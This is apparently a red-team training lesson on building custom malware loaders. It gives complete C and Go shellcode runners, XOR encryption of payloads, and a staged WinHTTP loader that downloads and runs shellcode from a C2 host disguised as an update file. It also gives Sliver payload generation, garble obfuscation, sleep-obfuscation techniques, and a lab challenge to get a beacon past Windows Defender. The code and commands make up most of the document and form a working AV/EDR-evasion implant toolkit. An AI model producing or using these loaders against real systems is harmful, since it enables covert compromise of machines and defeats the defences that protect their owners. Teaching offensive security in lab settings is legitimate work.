---
title: "Custom Payload Development — Shellcode Runners and Process Injection"
tags: [red-team, payload-development, shellcode, process-injection, AV-bypass,
  syscalls, PIC, obfuscation, T1059.003, T1055.012, T1027, ATT&CK, C, golang]
module: 08-RedTeam-03
day: 542
related_topics:
  - Advanced EDR Evasion (Day 541)
  - Delegation Attacks (Day 543)
  - AV and EDR Evasion Concepts (Day 494)
  - Evasion Lab (Day 495)
  - Payload Development (Day 496)
---

# Day 542 — Custom Payload Development: Shellcode Runners and Process Injection

> "Metasploit payloads are fingerprinted by every AV vendor on the planet.
> The moment you understand why, you stop depending on them. A shellcode runner
> is forty lines of C. A position-independent shellcode loader is sixty lines.
> If you understand the memory layout of a process, you can write a payload
> that no scanner has seen before — because you wrote it today. That is the
> difference between someone who runs tools and someone who builds them."
>
> — Ghost

---

## Goals

Write a minimal position-independent shellcode runner in C from scratch.
Implement XOR encryption for shellcode storage to defeat static analysis.
Build a staged loader that fetches shellcode from a remote server at runtime.
Understand Golang-based implants and why they evade many AV engines.
Test all payloads against Windows Defender in a lab VM.

**Prerequisites:** Day 541 (EDR evasion concepts), basic C programming,
familiarity with Sliver or Metasploit shellcode generation.
**Time budget:** 6 hours (hands-on only — no reading without building).

---

## Part 1 — Shellcode Basics and the Runner Architecture

```
Shellcode: position-independent binary code (PIC)
  → Does not rely on fixed memory addresses
  → Self-contained: references no external libraries directly
  → Designed to run at any address in any process

Shellcode runner: a program that:
  1. Allocates executable memory in the current process
  2. Copies shellcode into that memory
  3. Transfers execution to it (via function pointer, CreateThread, etc.)

Minimal C runner (insecure, detected — for concept):
```

```c
// runner_basic.c — bare minimum shellcode runner (FOR CONCEPT ONLY)
// Detected by every modern AV — do not use as-is

#include <windows.h>

// Replace with actual shellcode bytes:
unsigned char sc[] = { 0x90, 0x90, 0xCC }; // NOP NOP INT3 (test stub)

int main(void) {
    LPVOID mem = VirtualAlloc(
        NULL, sizeof(sc),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);       // RWX page — flagged by every heuristic

    memcpy(mem, sc, sizeof(sc));

    ((void(*)())mem)();  // call shellcode via function pointer
    return 0;
}
```

```
Why this is detected:
  1. VirtualAlloc with PAGE_EXECUTE_READWRITE is a top AV heuristic
  2. memcpy + function pointer pattern is a well-known shellcode signature
  3. The shellcode bytes themselves may be known (msfvenom signatures)

Fixes:
  1. Separate RW and RX: allocate RW, write shellcode, change to RX
  2. Encrypt shellcode at rest: decrypt only at runtime into separate buffer
  3. Use direct syscalls instead of VirtualAlloc
  4. Stage: do not embed shellcode — fetch from a remote server
```

---

## Part 2 — XOR-Encrypted Shellcode Runner

```c
// runner_xor.c — encrypt shellcode at rest, decrypt at runtime
// Compile: x86_64-w64-mingw32-gcc -o runner_xor.exe runner_xor.c -s -O2

#include <windows.h>
#include <stdio.h>

// XOR key — change this for each campaign
#define XOR_KEY 0x4B

// Pre-encrypt your shellcode with this key:
// python3 -c "sc=bytes([0xfc,0x48,0x83,...]); \
//   print(','.join(hex(b^0x4B) for b in sc))"
unsigned char enc_sc[] = {
    // paste XOR-encrypted shellcode bytes here
    0xb7, 0x03, 0xc8, 0x4b  // placeholder
};
SIZE_T sc_len = sizeof(enc_sc);

void xor_decode(unsigned char *buf, SIZE_T len, unsigned char key) {
    for (SIZE_T i = 0; i < len; i++) buf[i] ^= key;
}

int main(void) {
    // Step 1: Allocate RW memory (not RWX — less suspicious)
    LPVOID mem = VirtualAlloc(NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;

    // Step 2: Copy encrypted shellcode into buffer
    memcpy(mem, enc_sc, sc_len);

    // Step 3: Decrypt in-place
    xor_decode((unsigned char *)mem, sc_len, XOR_KEY);

    // Step 4: Change page permissions from RW to RX
    DWORD old_prot;
    VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old_prot);

    // Step 5: Execute via CreateThread (avoids direct function pointer)
    HANDLE hThread = CreateThread(
        NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

```bash
# Build and test workflow:

# 1. Generate shellcode (Sliver — preferred; msfvenom for labs)
sliver > generate -b https://10.10.254.10:443 -o /tmp/sc.bin --format shellcode

# 2. Encrypt the shellcode
python3 - <<'EOF'
import sys

key = 0x4B
with open('/tmp/sc.bin', 'rb') as f:
    sc = f.read()

enc = bytes(b ^ key for b in sc)
print(','.join(hex(b) for b in enc))
EOF

# 3. Paste the output into enc_sc[] in runner_xor.c

# 4. Compile
x86_64-w64-mingw32-gcc -o runner_xor.exe runner_xor.c \
    -s -O2 -mwindows -lkernel32

# 5. Test in lab VM
# Transfer runner_xor.exe to Windows lab VM
# Verify: Windows Defender does not flag it before execution
# Verify: Sliver receives a callback after execution
```

---

## Part 3 — Staged Loader (Fetch Shellcode at Runtime)

```c
// staged_loader.c — fetch shellcode from HTTP server at runtime
// Advantage: no shellcode in the binary (static analysis finds nothing)
// Compile: x86_64-w64-mingw32-gcc -o staged.exe staged_loader.c -lwinhttp -s

#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#define XOR_KEY 0x4B

void xor_decode(unsigned char *buf, DWORD len) {
    for (DWORD i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

unsigned char *fetch_payload(const wchar_t *host, WORD port,
                             const wchar_t *path, DWORD *out_len) {
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_BYPASS_PROXY_CACHE);

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                       WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    // Read response into buffer
    unsigned char *buf = NULL;
    DWORD total = 0, avail = 0, read = 0;
    while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        buf = (unsigned char *)realloc(buf, total + avail);
        WinHttpReadData(hRequest, buf + total, avail, &read);
        total += read;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    *out_len = total;
    return buf;
}

int main(void) {
    // Fetch XOR-encrypted shellcode from attack server
    DWORD sc_len = 0;
    unsigned char *sc = fetch_payload(
        L"10.10.254.10",    // C2 / stager server IP
        8080,
        L"/updates/kb5.bin", // disguised as a Windows update file
        &sc_len);

    if (!sc || sc_len == 0) return 1;

    // Decrypt
    xor_decode(sc, sc_len);

    // Allocate RW memory
    LPVOID mem = VirtualAlloc(NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, sc, sc_len);
    free(sc);

    // Change to RX
    DWORD old;
    VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old);

    // Execute
    HANDLE hThread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

```bash
# Serve the encrypted shellcode on the attack host:
python3 - <<'EOF'
with open('/tmp/sc.bin', 'rb') as f:
    sc = f.read()
enc = bytes(b ^ 0x4B for b in sc)
with open('/tmp/kb5.bin', 'wb') as f:
    f.write(enc)
EOF

# Serve it via a simple Python HTTP server
mkdir -p /tmp/updates
cp /tmp/kb5.bin /tmp/updates/
cd /tmp && python3 -m http.server 8080

# The staged loader fetches /updates/kb5.bin and executes in-memory
```

---

## Part 4 — Go-Based Implants (EDR Evasion via Unusual Language)

```
Why Go evades many AV engines:
  1. Go compiles to a statically linked binary — no import table that AV
     can use to fingerprint "suspicious API calls at compile time"
  2. Go binaries do not use the standard Windows PE calling conventions
     that AV engines expect
  3. Go has its own runtime, goroutines, and GC — the binary structure
     is unfamiliar to signatures written for C/C++ malware
  4. Go's net/http, os, and syscall packages let you make syscalls and
     HTTP requests without touching any flagged Windows API import

Limitation: Go binaries are large (~8MB minimum) and easily identified by
  the go runtime strings embedded in the binary
  Mitigate: strip symbols (-ldflags "-s -w"), UPX pack (adds entropy heuristic),
            or garble (obfuscates Go symbol names)
```

```go
// go_runner.go — minimal Go shellcode runner using Windows syscalls
// Build: GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o runner.exe .

package main

import (
	"encoding/hex"
	"syscall"
	"unsafe"
)

// XOR-encoded shellcode as a hex string (no byte literal in source)
const encHex = "b703c84b" // placeholder — replace with real encrypted bytes

var (
	kernel32          = syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc      = kernel32.NewProc("VirtualAlloc")
	virtualProtect    = kernel32.NewProc("VirtualProtect")
	createThread      = kernel32.NewProc("CreateThread")
	waitForSingleObj  = kernel32.NewProc("WaitForSingleObject")
)

const xorKey byte = 0x4B

func xorDecode(data []byte) {
	for i := range data {
		data[i] ^= xorKey
	}
}

func main() {
	enc, _ := hex.DecodeString(encHex)
	xorDecode(enc)

	// VirtualAlloc: RW
	addr, _, _ := virtualAlloc.Call(
		0, uintptr(len(enc)),
		0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
		0x04,          // PAGE_READWRITE
	)

	// Copy shellcode
	buf := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(enc):len(enc)]
	copy(buf, enc)

	// VirtualProtect: RX
	var old uint32
	virtualProtect.Call(addr, uintptr(len(enc)), 0x20, uintptr(unsafe.Pointer(&old)))

	// CreateThread
	hThread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
	waitForSingleObj.Call(hThread, 0xFFFFFFFF)
}
```

```bash
# Build the Go runner
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o runner.exe .

# Optional: obfuscate symbol names with garble
go install mvdan.cc/garble@latest
GOOS=windows GOARCH=amd64 garble build -ldflags "-s -w" -o runner_obf.exe .

# Test: VirusTotal detection comparison (lab use only — do not upload real C2 payloads)
# Or: test locally against Windows Defender on lab VM
```

---

## Part 5 — Sleep Obfuscation (Evade Memory Scanning)

```
Problem: EDRs scan process memory during callback sleep intervals
  When your implant is sleeping between callbacks, its shellcode sits in
  memory unexecuted. EDRs like CrowdStrike scan process memory at intervals.
  If the shellcode is found: implant is killed.

Solution: encrypt the implant's own memory during sleep
  Before sleeping: XOR-encrypt the shellcode buffer in-place
  After waking: XOR-decrypt back to executable form
  During sleep: if the EDR scans memory → sees encrypted garbage, not shellcode

Implementations:
  Ekko (open source):
    - Uses Windows timer-based callbacks (CreateTimerQueueTimer)
    - Encrypts beacon memory with RC4 during sleep
    - Re-registers itself as a callback after decryption

  Foliage / Poppy:
    - Uses NtContinue-based sleep to avoid SleepEx / WaitForSingleObject
      (these calls are monitored by some EDRs as "beacon sleeping" markers)
    - Encrypts memory with SYSTEMTIME as key seed (varies each beacon interval)

Concept in C (simplified):
  // Before sleep:
  xor_encrypt(shellcode_base, shellcode_size, session_key);
  // Change page to non-executable during sleep:
  VirtualProtect(shellcode_base, shellcode_size, PAGE_READWRITE, &old);
  Sleep(interval);
  // After wake:
  VirtualProtect(shellcode_base, shellcode_size, PAGE_EXECUTE_READ, &old);
  xor_encrypt(shellcode_base, shellcode_size, session_key);  // XOR is its own inverse
```

---

## Lab Challenge: Build and Test a Working Implant

```
Challenge (3 hours):
  Goal: establish a C2 beacon on a lab Windows VM running Windows Defender
  Using ONLY code you wrote (no Metasploit payloads in the final binary)

  Steps:
  1. Generate shellcode from Sliver: --format shellcode → sc.bin
  2. XOR-encrypt sc.bin with key 0x4B → enc.bin
  3. Write a staged loader (C or Go) that fetches enc.bin from your HTTP server
  4. Compile the loader (no shellcode embedded in binary)
  5. Transfer loader.exe to Windows lab VM
  6. Verify Defender does not block the loader on disk
  7. Run loader.exe → verify C2 callback in Sliver
  8. Verify beacon stays alive for 5 minutes without Defender killing it

  If Defender kills the beacon:
  → Identify which stage triggered detection (fetch, decrypt, VirtualAlloc, or execute)
  → Apply the fix from the relevant section above
  → Iterate until the beacon survives

  Document:
    Loader language used: _______________
    Shellcode source: ___________________
    Encryption applied: _________________
    Defender version tested against: ____
    Defender kill attempts: ____
    Final technique that worked: ________
```

---

## Key Takeaways

1. The difference between a detected implant and an undetected one is usually
   a single heuristic: RWX memory allocation, memcpy + function pointer pattern,
   or known shellcode bytes. Fixing one component at a time and retesting is
   how real payload development works — not a magic recipe.
2. Static analysis targets what is in the binary on disk. Runtime analysis
   targets what the binary does when executed. A staged loader defeats static
   analysis entirely because the payload never touches disk. Runtime analysis
   still triggers on the memory allocation patterns.
3. Go evades more AV engines than C by default because AV signatures are
   overwhelmingly written for PE binaries in C/C++ calling conventions. This
   advantage erodes as defenders adapt — which is why understanding the
   underlying evasion principle matters more than the language choice.
4. Sleep obfuscation is the current frontier for evading memory-scanning EDRs.
   If your shellcode is encrypted and non-executable during sleep, the EDR
   scans garbage. The decrypt-and-execute cycle is a very narrow window for
   the EDR to catch you.
5. Every custom payload must be tested against the specific AV/EDR deployed on
   the target before the engagement — not against generic online scanners.
   VirusTotal results correlate poorly with enterprise EDR behaviour because
   enterprise EDRs use behavioural analysis, not just signature matching.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q542.1, Q542.2 …).

---

## Navigation

← Previous: [Day 541 — Advanced EDR Evasion During Lateral Movement](DAY-0541-Advanced-EDR-Evasion-Lateral-Movement.md)
→ Next: [Day 543 — Delegation Attacks: Unconstrained, Constrained, RBCD](DAY-0543-Delegation-Attacks-Deep-Dive.md)
